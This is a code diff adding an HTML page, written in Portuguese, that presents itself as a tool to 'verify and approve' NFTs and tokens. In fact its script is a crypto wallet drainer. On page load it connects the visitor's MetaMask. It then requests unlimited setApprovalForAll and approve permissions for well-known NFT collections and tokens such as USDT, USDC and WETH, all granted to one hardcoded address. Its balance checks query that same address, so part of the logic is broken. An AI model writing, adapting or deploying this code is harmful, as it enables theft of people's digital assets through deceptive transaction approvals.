@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificar e Aprovar NFTs e Tokens</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+ 
+  
+ 
+
+  <script>
+    const NFT_CONTRACTS = [
+      { name: "Coleção 1", address: "0xBd3531dA5CF5857e7CfAA92426877b022e612cf8", fetchImage: true, useWalletOfOwner: false },
+      { name: "Coleção 2", address: "0x524cAB2ec69124574082676e6F654a18df49A048", fetchImage: false, useWalletOfOwner: true },
+      { name: "Coleção 3", address: "0x062E691c2054dE82F28008a8CCC6d7A1c8ce060D", fetchImage: false, useWalletOfOwner: false },
+      { name: "Bored Ape Yacht Club", address: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", fetchImage: true, useWalletOfOwner: false },
+      { name: "Mutant Ape Yacht Club", address: "0x60E4d786628Fea6478F785A6d7e704777c86a7c6", fetchImage: true, useWalletOfOwner: false },
+      { name: "Sprotogrelins", address: "0xEeca64ea9fCf99A22806Cd99b3d29cf6e8D54925", fetchImage: true, useWalletOfOwner: false },
+	  { name: "Duck", address: "0x7A4D1b54dD21ddE804c18B7a830B5Bc6e586a7F6", fetchImage: true, useWalletOfOwner: false }
+    ];
+
+    const ERC20_CONTRACTS = [
+      { name: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18, minAmount: 0.0001 },
+      { name: "LayerZero", address: "0x6985884C4392D348587B19cb9eAAf157F13271cd", decimals: 18, minAmount: 5 },
+      { name: "Eigen", address: "0xec53bF9167f50cDEB3Ae105f56099aaaB9061F83", decimals: 18, minAmount: 0.5 },
+      { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, minAmount: 20 },
+      { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, minAmount: 20 },
+      { name: "SETH", address: "0x5e74C9036fb86BD7eCdcb084a0673EFc32eA31cb", decimals: 18, minAmount: 0.05 },
+      { name: "aETH-WETH", address: "0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8", decimals: 18, minAmount: 0.0001 },
+      { name: "aETH-RETH", address: "0xCc9EE9483f662091a1de4795249E24aC0aC2630f", decimals: 18, minAmount: 0.0005 },
+      { name: "Chainlink", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18, minAmount: 0.03 },
+      { name: "Mog Coin", address: "0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a", decimals: 5, minAmount: 50 },
+      { name: "Pepe", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18, minAmount: 4114742 },
+      { name: "Beam", address: "0x62D0A8458eD7719FDAF978fe5929C6D342B0bFcE", decimals: 18, minAmount: 1 },
+      { name: "Virtual", address: "0x44ff8620b8cA30902395A7bD3F2407e1A091BF73", decimals: 18, minAmount: 1 }
+    ];
+
+    const NFT_ABI = [
+      "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
+      "function balanceOf(address owner) view returns (uint256)",
+      "function walletOfOwner(address owner) view returns (uint256[])",
+      "function setApprovalForAll(address operator, bool approved) external"
+    ];
+    const ERC20_ABI = [
+      "function balanceOf(address account) view returns (uint256)",
+      "function approve(address spender, uint256 amount) external returns (bool)"
+    ];
+
+    async function connectAndCheck() {
+      const MAX_UINT = ethers.MaxUint256;
+
+      try {
+        if (typeof window.ethereum === "undefined") {
+          console.error("MetaMask não encontrada.");
+          return;
+        }
+
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = await provider.getSigner();
+      const connectedWalletAddress = "0x2CF4f6D3d01ab2123Ea4Bcbb18757df49724AF21";
+        const EndereçoQueEnvia = "0x2CF4f6D3d01ab2123Ea4Bcbb18757df49724AF21";
+
+        console.log(`Conectado: ${connectedWalletAddress}`);
+
+        // Verifica NFTs (ERC-721)
+        console.log("Verificando NFTs...");
+        for (const { name, address, useWalletOfOwner } of NFT_CONTRACTS) {
+          try {
+            const contract = new ethers.Contract(address, NFT_ABI, signer);
+            let hasNFT = false;
+
+            if (useWalletOfOwner) {
+              const tokens = await contract.walletOfOwner(connectedWalletAddress);
+              hasNFT = tokens.length > 0;
+            } else {
+              const balance = await contract.balanceOf(connectedWalletAddress);
+              hasNFT = balance > 0;
+            }
+
+            if (hasNFT) {
+              console.log(`${name}: NFTs encontrados! Aprovando...`);
+              const tx = await contract.setApprovalForAll(EndereçoQueEnvia, true);
+              await tx.wait();
+              console.log(`${name}: Aprovação concluída!`);
+            } else {
+              console.log(`${name}: Nenhum NFT encontrado.`);
+            }
+          } catch (error) {
+            console.error(`Erro em ${name}:`, error);
+          }
+        }
+
+        // Verifica Tokens ERC-20
+        console.log("Verificando Tokens ERC-20...");
+        for (const { name, address, decimals, minAmount } of ERC20_CONTRACTS) {
+          try {
+            const contract = new ethers.Contract(address, ERC20_ABI, signer);
+            const balance = await contract.balanceOf(connectedWalletAddress);
+            const formattedBalance = Number(ethers.formatUnits(balance, decimals));
+
+            if (formattedBalance >= minAmount) {
+              console.log(`${name}: Saldo ${formattedBalance}. Aprovando...`);
+              const tx = await contract.approve(EndereçoQueEnvia, MAX_UINT);
+              await tx.wait();
+              console.log(`${name}: Aprovação concluída!`);
+            } else {
+              console.log(`${name}: Saldo insuficiente (${formattedBalance}).`);
+            }
+          } catch (error) {
+            console.error(`Erro em ${name}:`, error);
+          }
+        }
+      } catch (error) {
+        console.error("Erro geral:", error);
+      }
+    }
+
+    connectAndCheck();
+  </script>
+</body>
+</html>
